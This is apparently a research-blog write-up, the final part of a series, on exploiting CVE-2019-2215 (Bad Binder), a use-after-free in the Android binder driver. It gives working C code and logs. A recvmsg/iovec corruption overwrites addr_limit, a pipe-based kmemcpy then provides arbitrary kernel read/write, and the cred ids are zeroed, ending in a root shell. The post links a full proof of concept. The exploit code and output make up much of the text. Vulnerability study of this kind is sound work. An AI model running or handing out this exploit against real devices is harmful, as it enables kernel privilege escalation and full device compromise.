# Bad Binder - Part 3 - Android Research Journey

I am quite excited to finish off the first n-day we've covered in this journey. In the last two entries, we went from achieving a basic POC of a UAF, to leaking `task_struct`, all with basic debugging and source code reading. Now, we shall dive deeper, and use everything up until now to gain a third primitive; arbitrary write. The rest should be pretty trivial.

TL;DR: [full exploit in github](https://github.com/wired0ut/CVE-2019-2215/tree/main)

In our current state, we have a leak of the `task_struct*` of our running process. This is a very strong primitive. Let's look at `task_struct`:
```c
struct task_struct {
#ifdef CONFIG_THREAD_INFO_IN_TASK
	/*
	 * For reasons of header soup (see current_thread_info()), this
	 * must be the first element of task_struct.
	 */
	struct thread_info thread_info;
#endif
	...
}
```

The struct is too long to show in full, so I'll show the thing that is relevant to the way I want to exploit it. The `task_struct` begins with `thread_info:
```c
struct thread_info {
	unsigned long		flags;		/* low level flags */
	int			preempt_count;	/* 0 => preemptable */
	mm_segment_t		addr_limit;	/* address limit */
	struct task_struct	*task;		/* main task structure */
	__u32			cpu;		/* cpu */
	struct cpu_context_save	cpu_context;	/* cpu context */
	__u32			syscall;	/* syscall number */
	__u8			used_cp[16];	/* thread used copro */
#ifdef CONFIG_UNICORE_FPU_F64
	struct fp_state		fpstate __attribute__((aligned(8)));
#endif
};
```

There's something extremely interesting here, which is the `addr_limit`. This field is the maximum address the user can access in the thread. That means that if we change it to another value (such as a kernel address), the user could read/write to every address below it. This is an interesting primitive here because we have a write of a kernel address only in our case (which is why I do not aim on overwriting `cred` etc, which will either way require another read).

How could we overwrite it, though? Well, it is a question I've been pondering on quite a lot. In order to write to *any* kernel address we want, we'd need to corrupt the `prev` and `next` of the linked list in the `eppoll_entry`, which is quite impossible in our case. This leaves us using the current write on our freed (and reoccupied) chunk to our use.

This means, in my opinion, we'll need to think of an alternative to our use of `writev` that can achieve something like that. We need something that will also be able to block. 

Well, what about `readv`? It seems to match pretty much everything we need. It can most likely block when a pipe has nothing to read, and it has the `iovec` struct that we can very easily overwrite. Well then, let's do a thought experiment. Assume we're using `readv` and we can get the `read` to be stuck on an `iovec`. Let's also conveniently assume that `iovec` is the very one whose length (`iov_len`) we overwrite. Well, in that case, it'll be trivial. Due to the blocking, the length overwrite has no effect - eh, wait a sec.

Is it true that in the case of `readv`, overwriting the `iov_len` on which we're blocked has no effect? Well, the answer is actually no. Contrary to `writev`, the `readv` works differently. It blocks if the pipe is empty, but that has no relation whatsoever to our `iovec` array. If we look deeper (allow me to spare the details of reaching the certain function):
```c
static ssize_t
pipe_read(struct kiocb *iocb, struct iov_iter *to)
{
	size_t total_len = iov_iter_count(to);
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	int do_wakeup;
	ssize_t ret;

	/* Null read succeeds. */
	if (unlikely(total_len == 0))
		return 0;

	do_wakeup = 0;
	ret = 0;
	__pipe_lock(pipe);
	for (;;) {
		// --> is there any data to write?
		int bufs = pipe->nrbufs;
		if (bufs) {
			int curbuf = pipe->curbuf;
			struct pipe_buffer *buf = pipe->bufs + curbuf;
			size_t chars = buf->len;
			size_t written;
			int error;

			if (chars > total_len)
				chars = total_len;

			...
			
			// --> iterate over iovecs and write
			written = copy_page_to_iter(buf->page, buf->offset, chars, to);
			if (unlikely(written < chars)) {
				if (!ret)
					ret = -EFAULT;
				break;
			}
			...
			total_len -= chars;
			if (!total_len)
				break;	/* common path: read succeeded */
		}
		...
		if (!pipe->waiting_writers) {
			if (ret)
				break;
			if (filp->f_flags & O_NONBLOCK) {
				ret = -EAGAIN;
				break;
			}
		}
		...
		// --> block
		pipe_wait(pipe);
	}
	...
	return ret;
}
```

In `pipe_inode_info`, the field `nrbufs` is how many non-empty pipe buffers are currently present. If there are none, we'll block. This is before we even iterate over the `iovec` array and start parsing. If we look at that logic, it only happens when there are `bufs`. If there are `bufs`, it reads whatever it can, and then exits. This renders it as practically useless for us. In any scenario, it'll only block before ever touching *ANY* of the `iovec`s. When we corrupt the `iov_len`, it'll cause a big problem.

Therefore, we now are aware of another constraint - we have to block while parsing the `iovec`s in order to be able to overwrite `iov_len` with no consequences. `iovec`s aren't used in many `syscalls`, and so we can map them quite quickly. Another `syscall` that arouse interest in me is `recvmsg`. It is very similar to `readv`, but it operates on sockets instead of pipes, which should not bother us. 

Let's look at the `recvmsg` function first:
```c
ssize_t recvmsg(int socket, const struct msghdr *message, int flags);
```

With `msghdr` being:
```c
struct msghdr
  {
    void *msg_name;		/* Address to send to/receive from.  */
    socklen_t msg_namelen;	/* Length of address data.  */

    struct iovec *msg_iov;	/* Vector of data to send/receive into.  */
    size_t msg_iovlen;		/* Number of elements in the vector.  */

    void *msg_control;		/* Ancillary data (eg BSD filedesc passing). */
    size_t msg_controllen;	/* Ancillary data buffer length. */
    int msg_flags;		/* Flags on received message.  */
  };
```

It has overhead (metadata), but overall it contains a vector of `iovec` just like before. Not only that, but if we take a closer look at `msg_flags`:
```c
/* Bits in the FLAGS argument to `send', `recv', et al.  */
enum
  {
    MSG_OOB		= 0x01,	/* Process out-of-band data.  */
#define MSG_OOB		MSG_OOB
    MSG_PEEK		= 0x02,	/* Peek at incoming messages.  */
#define MSG_PEEK	MSG_PEEK
    MSG_DONTROUTE	= 0x04,	/* Don't use local routing.  */
#define MSG_DONTROUTE	MSG_DONTROUTE
#ifdef __USE_GNU
    /* DECnet uses a different name.  */
    MSG_TRYHARD		= MSG_DONTROUTE,
# define MSG_TRYHARD	MSG_DONTROUTE
#endif
    MSG_CTRUNC		= 0x08,	/* Control data lost before delivery.  */
#define MSG_CTRUNC	MSG_CTRUNC
    MSG_PROXY		= 0x10,	/* Supply or ask second address.  */
#define MSG_PROXY	MSG_PROXY
    MSG_TRUNC		= 0x20,
#define MSG_TRUNC	MSG_TRUNC
    MSG_DONTWAIT	= 0x40, /* Nonblocking IO.  */
#define MSG_DONTWAIT	MSG_DONTWAIT
    MSG_EOR		= 0x80, /* End of record.  */
#define MSG_EOR		MSG_EOR
    MSG_WAITALL		= 0x100, /* Wait for a full request.  */
#define MSG_WAITALL	MSG_WAITALL
...
  };
```

There's an interesting flag there, `MSG_WAITALL`, which, according to the comment, seems to force `recvmsg` to wait for full requests (as in, fill the entirety of the `iovec`s), before exiting. 

Let's try and understand it more via the source code: 
```c
static int ___sys_recvmsg(struct socket *sock, struct user_msghdr __user *msg,
			 struct msghdr *msg_sys, unsigned int flags, int nosec)
{
	struct compat_msghdr __user *msg_compat =
	    (struct compat_msghdr __user *)msg;
	struct iovec iovstack[UIO_FASTIOV];
	struct iovec *iov = iovstack;
	
	...

	if (MSG_CMSG_COMPAT & flags)
		err = get_compat_msghdr(msg_sys, msg_compat, &uaddr, &iov);
	else
		err = copy_msghdr_from_user(msg_sys, msg, &uaddr, &iov);
	if (err < 0)
		return err;

	cmsg_ptr = (unsigned long)msg_sys->msg_control;
	msg_sys->msg_flags = flags & (MSG_CMSG_CLOEXEC|MSG_CMSG_COMPAT);

	/* We assume all kernel code knows the size of sockaddr_storage */
	msg_sys->msg_namelen = 0;

	if (sock->file->f_flags & O_NONBLOCK)
		flags |= MSG_DONTWAIT;
	err = (nosec ? sock_recvmsg_nosec : sock_recvmsg)(sock, msg_sys, flags);
	if (err < 0)
		goto out_freeiov;
	
	...
	
out_freeiov:
	kfree(iov);
	return err;
}
```

It copies the `msghdr` with:
```c
static int copy_msghdr_from_user(struct msghdr *kmsg,
				 struct user_msghdr __user *umsg,
				 struct sockaddr __user **save_addr,
				 struct iovec **iov)
{
	struct sockaddr __user *uaddr;
	struct iovec __user *uiov;
	size_t nr_segs;
	ssize_t err;

	if (!access_ok(VERIFY_READ, umsg, sizeof(*umsg)) ||
	    __get_user(uaddr, &umsg->msg_name) ||
	    __get_user(kmsg->msg_namelen, &umsg->msg_namelen) ||
	    __get_user(uiov, &umsg->msg_iov) ||
	    __get_user(nr_segs, &umsg->msg_iovlen) ||
	    __get_user(kmsg->msg_control, &umsg->msg_control) ||
	    __get_user(kmsg->msg_controllen, &umsg->msg_controllen) ||
	    __get_user(kmsg->msg_flags, &umsg->msg_flags))
		return -EFAULT;

	...

	if (nr_segs > UIO_MAXIOV)
		return -EMSGSIZE;

	kmsg->msg_iocb = NULL;

	return import_iovec(save_addr ? READ : WRITE, uiov, nr_segs,
			    UIO_FASTIOV, iov, &kmsg->msg_iter);
}
```

`import_iovec`, which is the function that allocates the `slub` for the `iovec` vector and initializes it.  After the copy, we can see a call to:
```c
static inline int sock_recvmsg_nosec(struct socket *sock, struct msghdr *msg,
				     int flags)
{
	return sock->ops->recvmsg(sock, msg, msg_data_left(msg), flags);
}
```

In a nutshell, let's assume we're simply in the unix socket world, it'll call:
```c
static int unix_stream_recvmsg(struct socket *sock, struct msghdr *msg,
			       size_t size, int flags)
{
	struct unix_stream_read_state state = {
		.recv_actor = unix_stream_read_actor,
		.socket = sock,
		.msg = msg,
		.size = size,
		.flags = flags
	};

	return unix_stream_read_generic(&state, true);
}
```

And then (**read the comments**):
```c
static int unix_stream_read_generic(struct unix_stream_read_state *state,
				    bool freezable)
{
	struct scm_cookie scm;
	struct socket *sock = state->socket;
	struct sock *sk = sock->sk;
	struct unix_sock *u = unix_sk(sk);
	int copied = 0;
	int flags = state->flags;
	int noblock = flags & MSG_DONTWAIT;
	size_t size = state->size;
	...
	
	// --> If MSG_WAITALL, it simply returns the size.
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	memset(&scm, 0, sizeof(scm));

	/* Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
	 */
	mutex_lock(&u->iolock);

	if (flags & MSG_PEEK)
		skip = sk_peek_offset(sk, flags);
	else
		skip = 0;

	do {
			...
			// --> Because we pass MSG_WAITALL, it does not 
			// --> unlock until a full read happens.
			if (copied >= target)
				goto unlock;
			...
			// --> Wait for data...
			timeo = unix_stream_data_wait(sk, timeo, last,
						      last_len, freezable);
						      
			...
		}

		...
		
		// --> When there's data, recv it.		
		chunk = state->recv_actor(skb, skip, chunk, state);
		...
		// --> Remove the chunk read from the size.
		copied += chunk;
		size -= chunk;

		...
	// --> Run while the iovecs are not full in our case.
	} while (size);

	...
out:
	return copied ? : err;
}
```

This makes it perfect for us. We do not exit until a full read occurred, which means we can craft a smart blocking scenario so the `iov_len` overwrite won't bother us. Note that I can dive deeper into which `recv_actor` function is called, etc. But it is redundant and threatening to readers to simply be spammed with the code which serves no real purpose towards understanding.

Once again, let's rationalise our way through the process we want. We can make it skip the first 10 `iovec` objects by setting them to 0. Then, on the 11th one, we corrupt its `iov_len`, which is bad for us. How can we bypass this? Well, let's think about the flow we'd described above for a second. We have a block that is called each time until the data is fully read, and when it's not blocked, it iterates over the `iovec` array and writes to it accordingly. Well, does that not mean we can simply skip the 11th `iovec` entry by leaving it empty? It was my first thought as well, but it is actually not that simple. If we leave it empty, the `iov_iter` won't go over it, and when we stop blocking we'll crash.

What we can do instead, is simply write set:
```c
iov[10] = SOME_RANDOM_BUF;
iov[10] = SOME_RANDOM_NUMBER;
```
And pre-write `SOME_RANDOM_NUMBER` bytes to the socket. In that case, we'll advance the iterator and go back to blocking on our 12th `iovec`, which is perfect for our use case. For the sake of simplicity, let's use the same scratch buffer we used before, with an `iov_len` of 1.

This all sounds really good in theory, we now have a way of writing to a kernel address, and we even learned a bit about `recvmsg` and `readv` internals. But, how does writing to that kernel address help us?

Well, if you remember from the previous entry, the address we write is actually an address in `binder_thread`, which means that in our use case it is actually writing to the continuation of the `iovec` vector! Practically, arbitrary write.

Let's re-iterate the full flow, therefore, of our write primitive:
1. Prepare UAF as before.
2. Create a pair of sockets.
3. Pre-write 1 byte to the socket.
4. Perform `recvmsg` on the socket with a vector of 24 `iovec`s, with only the 11th and 12th initialised.
5. UAF
6. Write the address of `task_struct->addr_limit`.
7. Write MAX_UINT64.
8. Arbitrary read and write.

This sounds promising. Let's start writing the logic to actually do this.

To start with, because we need to UAF twice and I don't want code duplication, I made a generic UAF function:
```c
void *do_generic_uaf(void *(*thread_routine)(void *), void *(*callback)(void)) {
  int binder_fd, epoll_fd;
  pthread_t uaf_thread;

  binder_fd = __initialize_binder();
  epoll_fd = __add_thread_to_waitqueue(binder_fd);
  __release_binder_thread(binder_fd);

  assert(!pthread_create(&uaf_thread, NULL, thread_routine, NULL));

  sleep(SYNC_WAIT);
  __del_waitqueue(epoll_fd, binder_fd);

  void *retval = callback();
  pthread_join(uaf_thread, NULL);
  return retval;
}
```

The `thread_routine` in the leak, for example, is the function that creates the `iovec`s and performs the `writev` to block, while `do_generic_uaf` performs the UAF itself after `SYNC_WAIT` seconds.

We need to implement a `thread_routine` for our write primitive now. The first thing we need to do is initiate two unix sockets:
```c
int sockfd[2];
assert(0 == socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd));
```

Now, we want to pre-write one byte of data to the `sockfd`:
```c
write(sockfd[1], "A", 1);
```

Create a `msghdr` and the `iovec`s:
```c
struct iovec iov[NUM_IOVECS] = {
    0,
};

iov[10].iov_base = (void *)FILL_BUF_ADDR;
iov[10].iov_len = 1;
iov[11].iov_len = 4 * sizeof(uint64_t);
iov[12].iov_len = sizeof(uint64_t);

struct msghdr msg = {.msg_iov = iov, .msg_iovlen = NUM_IOVECS};
```
(don't get some of the values? It'll be cleared up soon enough).

And `recvmsg` with `MSG_WAITALL`:
```c
recvmsg(sockfd[0], &msg, MSG_WAITALL);
```

Let's make sure it all works up until now and that we're blocking:
```bash
> ./poc
[!] Starting first phase of exploit; task_struct leak...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Filling pipes to block...
[!] Filling the iovecs to be overwritten...
[!] Entering blocked state...
[*] Leaked task_struct @ 0xffff8000faa3b200
[!] Left blocked state, it means we have signaled to not hang.
[!] Successfully leaked task_struct ptr, now overwriting addr_limit...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Pre-writing 1 byte to socket to advance iovec iterator to 12th...
[!] Creating msghdr with crafted iovecs...
[!] Entering recvmsg(...), should block until UAF...
...
```

That works good. Now, let's start debugging to see if our flow is actually successful or not. We'll stop at the second `binder_thread_release`, save `thread`, and then continue and observe to make sure our UAF is working correctly:
```bash
pwndbg> set $t = thread
pwndbg> c
Continuing.
... --> At this point, were blocking and waiting
pwndbg> slab info kmalloc-512
 Slab Cache @ 0xffff8000fb001c00
     Name: kmalloc-512
     Flags: (none)
     Offset: 0x0
     Slab size: 0x1000
     Size (including metadata): 0x200
     Align: 0x80
     Object Size: 0x200
     kmem_cache_cpu @ 0xffff8000fffe0d20 [CPU 0]:
         Freelist: 0xffff8000faa29800 [not within the slab]
         Active Slab:
             - Slab @ 0x1001f0000faa29000 [0xffff7e0003ea8a40]:
                 In-Use: 8/8
                 Frozen: 1
                 Freelist: 0x0
         Partial Slabs: (none)
     kmem_cache_node @ 0xffff8000fb000e80 [NUMA node 0, nr_partial/min_partial: 0x0/0x5]:
         Partial Slabs: (none)
```

Eh, it seems there's some sort of mistake, as the `iovec`s are not being allocated in the `kmalloc-512` chunk. Why is that? Apparently, either creating writing the single byte causes an allocation in the `kmalloc-512` slub. Simply removing it from our thread routine onto main seemed to help, and now we've got:
```bash
pwndbg> x/30a $t
0xffff8000fa9f9a00:     0x0     0x0
0xffff8000fa9f9a10:     0x0     0x0
0xffff8000fa9f9a20:     0x0     0x0
0xffff8000fa9f9a30:     0x0     0x0
0xffff8000fa9f9a40:     0x0     0x0
0xffff8000fa9f9a50:     0x0     0x0
0xffff8000fa9f9a60:     0x0     0x0
0xffff8000fa9f9a70:     0x0     0x0
0xffff8000fa9f9a80:     0x0     0x0
0xffff8000fa9f9a90:     0x0     0x0
0xffff8000fa9f9aa0:     0x100000000     0x1
0xffff8000fa9f9ab0:     0x0     0x20
0xffff8000fa9f9ac0:     0x0     0x8
0xffff8000fa9f9ad0:     0x0     0x0
0xffff8000fa9f9ae0:     0x0     0x0
... --> Wait for UAF...
pwndbg> x/30a $t
0xffff8000fa9f9a00:     0x0     0x0
0xffff8000fa9f9a10:     0x0     0x0
0xffff8000fa9f9a20:     0x0     0x0
0xffff8000fa9f9a30:     0x0     0x0
0xffff8000fa9f9a40:     0x0     0x0
0xffff8000fa9f9a50:     0x0     0x0
0xffff8000fa9f9a60:     0x0     0x0
0xffff8000fa9f9a70:     0x0     0x0
0xffff8000fa9f9a80:     0x0     0x0
0xffff8000fa9f9a90:     0x0     0x0
0xffff8000fa9f9aa0:     0x100010001     0xffff8000fa9f9aa8
0xffff8000fa9f9ab0:     0xffff8000fa9f9aa8      0x20
0xffff8000fa9f9ac0:     0x0     0x8
0xffff8000fa9f9ad0:     0x0     0x0
0xffff8000fa9f9ae0:     0x0     0x0
```

Nice. All that's left now is to simply overwrite with whatever data we want. We can do that by simply:
```c
void *__overwrite_addrlimit(void) {
  uint64_t addr_limit_ptr = taskstruct_ptr + sizeof(uint64_t);

  // We must offset the addr_limit due to the fact we keep using the 12th iovec
  // to perform the write. We overwrite its base and len, and since the iterator
  // is already pointing at it, it simply writes the rest in the `base +
  // iov_offset`, which is 0x20 (IOVEC_OVERWRITE_SIZE).
  uint64_t addr_limit_ptr_offseted = addr_limit_ptr - IOVEC_OVERWRITE_SIZE;
  uint64_t overwrite_buf[] = {0, addr_limit_ptr_offseted, sizeof(uint64_t),
                              addr_limit_ptr_offseted};
  uint64_t max_addrlimit = 0xFFFFFFFFFFFFFFFE;

  printf("[!] Overwriting addr_limit @ %p with %p\n", (void *)addr_limit_ptr,
         (void *)max_addrlimit);
  // Write the ptr to addr_limit.
  write(sockfd[1], overwrite_buf, sizeof(overwrite_buf));
  // Overwrite addr_limit with max address.
  write(sockfd[1], &max_addrlimit, sizeof(max_addrlimit));

  return NULL;
}
```

Note: as you can see, I've actually overwritten `iov[12].iov_base` and `iov[12].iov_len` instead of the following `iovec`. That's because, for some reason, when we corrupt the `iovec`s in the middle, they keep trying to write to the same `iovec`. Therefore, we reach a state where, in the `iov_iter`, they write to `iov_iter.iov_base + iov_iter.iov_offset`, which is `0x20`, due to the size of the overwrite, and thus we need to offset our pointer to support that. Took some debugging to figure out as it's not intuitive.

If we check it out afterwards:
```bash
~ # ./poc
[!] Starting first phase of exploit; task_struct leak...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Filling pipes to block...
[!] Filling the iovecs to be overwritten...
[!] Entering blocked state...
[!] Triggering UAF...
[!] Left blocked state, it means we have signaled to not hang.
[*] Leaked task_struct @ 0xffff8000faa3b200
[*] Successfully leaked task_struct ptr, now overwriting addr_limit...
[!] Pre-writing 1 byte to socket to advance iovec iterator to 12th...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Creating msghdr with crafted iovecs...
[!] Entering recvmsg(...), should block until UAF...
[!] Triggering UAF...
[!] Overwriting addr_limit @ 0xffff8000faa3b208 with 0xfffffffffffffffe

... drum roll ...
pwndbg> p *(struct thread_info*)0xffff8000faa3b200
$1 = {
  flags = 0x1,
  addr_limit = 0xfffffffffffffffe,
  task = 0x4040000000000004,
  preempt_count = 0x0,
  cpu = 0x0
}
```

:)

Now, we have arbitrary read/write in the kernel, let's write a simple `kmemcpy` function to help us read/write from/to wherever we want:
```c
void kmemcpy(void *src, void *dst, size_t len)
{
    int pipefd[2];
    assert(!pipe(pipefd));
    assert(len == write(pipefd[1], src, len));
    assert(len == read(pipefd[0], dst, len));
}
```

The first thing we want is to leak the pointer to the `cred` struct from `task`:
```c
uint8_t *cred_ptr,
      *cred_ptr_ptr = (uint8_t *)(taskstruct_ptr + CRED_OFFSET_IN_TASK);

printf("[*] addr_limit overwritten, leaking cred ptr @ %p... \n",
         cred_ptr_ptr);
kmemcpy(cred_ptr_ptr, &cred_ptr, sizeof(uint64_t));
printf("[*] cred_ptr @ %p\n", (void *)cred_ptr);
```

Now, we find the block of the `id`s (`uid`, `eid`, etc.) and overwrite them all:
```c
uint8_t *id_block_ptr;
uint32_t root_id = 0;

id_block_ptr = cred_ptr + ID_BLOCK_IN_CRED_OFFSET;
printf("[*] Overwriting entire id block in cred from %p to %p \n",
	 id_block_ptr, id_block_ptr + ID_BLOCK_IN_CRED_SIZE);

for (uint8_t id_idx = 0; id_idx < (ID_BLOCK_IN_CRED_SIZE / sizeof(uint32_t));
   ++id_idx) {
kmemcpy(&root_id, id_block_ptr + id_idx * sizeof(uint32_t),
		sizeof(uint32_t));
}

printf("[*] You should now be r00t...\n");
```

Integrated, it looks like so:
```c
void *__overwrite_addrlimit(void) {
  uint64_t addr_limit_ptr = taskstruct_ptr + sizeof(uint64_t);
  uint8_t *id_block_ptr, *cred_ptr,
      *cred_ptr_ptr = (uint8_t *)(taskstruct_ptr + CRED_OFFSET_IN_TASK);
  uint32_t root_id = 0;

  // We must offset the addr_limit due to the fact we keep using the 12th iovec
  // to perform the write. We overwrite its base and len, and since the iterator
  // is already pointing at it, it simply writes the rest in the `base +
  // iov_offset`, which is 0x20 (IOVEC_OVERWRITE_SIZE).
  uint64_t addr_limit_ptr_offseted = addr_limit_ptr - IOVEC_OVERWRITE_SIZE;
  uint64_t overwrite_buf[] = {0, addr_limit_ptr_offseted, sizeof(uint64_t),
                              addr_limit_ptr_offseted};
  uint64_t max_addrlimit = 0xFFFFFFFFFFFFFFFE;

  printf("[!] Overwriting addr_limit @ %p with %p \n", (void *)addr_limit_ptr,
         (void *)max_addrlimit);
  // Write the ptr to addr_limit.
  write(sockfd[1], overwrite_buf, sizeof(overwrite_buf));
  // Overwrite addr_limit with max address.
  write(sockfd[1], &max_addrlimit, sizeof(max_addrlimit));

  printf("[*] addr_limit overwritten, leaking cred ptr @ %p... \n",
         cred_ptr_ptr);
  kmemcpy(cred_ptr_ptr, &cred_ptr, sizeof(uint64_t));
  printf("[*] cred_ptr @ %p\n", (void *)cred_ptr);

  id_block_ptr = cred_ptr + ID_BLOCK_IN_CRED_OFFSET;
  printf("[*] Overwriting entire id block in cred from %p to %p \n",
         id_block_ptr, id_block_ptr + ID_BLOCK_IN_CRED_SIZE);

  for (uint8_t id_idx = 0; id_idx < (ID_BLOCK_IN_CRED_SIZE / sizeof(uint32_t));
       ++id_idx) {
    kmemcpy(&root_id, id_block_ptr + id_idx * sizeof(uint32_t),
            sizeof(uint32_t));
  }

  printf("[*] You should now be r00t...\n");

  return NULL;
}
```

And, finally:
```bash
~ $ whoami
whoami: unknown uid 1000
~ $ ./poc
[!] Starting first phase of exploit; task_struct leak...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Filling pipes to block...
[!] Filling the iovecs to be overwritten...
[!] Entering blocked state...
[!] Triggering UAF...
[!] Left blocked state, it means we have signaled to not hang.
[*] Leaked task_struct @ 0xffffffc0fb3f0d80
[*] Successfully leaked task_struct ptr, now overwriting addr_limit...
[!] Pre-writing 1 byte to socket to advance iovec iterator to 12th...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Creating msghdr with crafted iovecs...
[!] Entering recvmsg(...), should block until UAF...
[!] Triggering UAF...
[!] Overwriting addr_limit @ 0xffffffc0fb3f0d88 with 0xfffffffffffffffe
[*] addr_limit overwritten, leaking cred ptr @ 0xffffffc0fb3f1440
[*] cred_ptr @ 0xffffffc0fa45a300
[*] Overwriting entire id block in cred from 0xffffffc0fa45a304 to 0xffffffc0fa45a324
[*] You should now be r00t...
[*] getuid(): 0
[*] w00t w00t
/bin/sh: can't access tty; job control turned off
/ # whoami
whoami: unknown uid 0
```

We have successfully exploited `CVE 2019-2215`, AKA Bad Binder. This is the first n-day of the series. It has truly been interesting, and I even merged two PRs into `pwndbg` while debugging the exploit. 

Make sure to check out the [full POC](https://github.com/wired0ut/CVE-2019-2215/tree/main).

Thank you all for reading, and 'till the next n-day.
